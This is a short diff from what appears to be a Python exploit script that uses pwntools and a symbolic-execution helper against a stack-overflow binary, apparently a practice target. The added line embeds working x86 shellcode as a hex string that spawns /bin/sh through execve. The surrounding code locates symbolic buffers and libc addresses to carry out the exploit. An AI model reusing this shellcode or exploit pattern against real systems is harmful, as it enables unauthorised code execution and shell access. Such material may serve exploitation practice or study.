@@ -30,6 +30,7 @@ def find_symbolic_buffer(state, length):
     for addr in sym_addrs:
         if check_continuity(addr, sym_addrs, length):
             yield addr
+shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
 exe = context.binary = ELF('vuln_stackoverflow-medium')
 libc = exe.libc
 base_libc = exe.maps[libc.path]
